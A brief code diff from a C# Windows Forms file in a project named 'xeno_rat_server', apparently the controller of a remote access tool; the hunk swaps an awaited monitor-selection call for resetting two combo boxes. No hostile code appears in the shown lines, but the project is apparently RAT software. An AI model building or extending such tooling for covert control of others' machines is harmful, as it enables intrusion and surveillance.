@@ -100,7 +100,8 @@ namespace xeno_rat_server.Forms
             else
             {
                 button2.Enabled = true;
-                await SetMonitor(0);
+                comboBox1.SelectedIndex = 0;
+                comboBox2.SelectedIndex = 0;
             }
         }
 
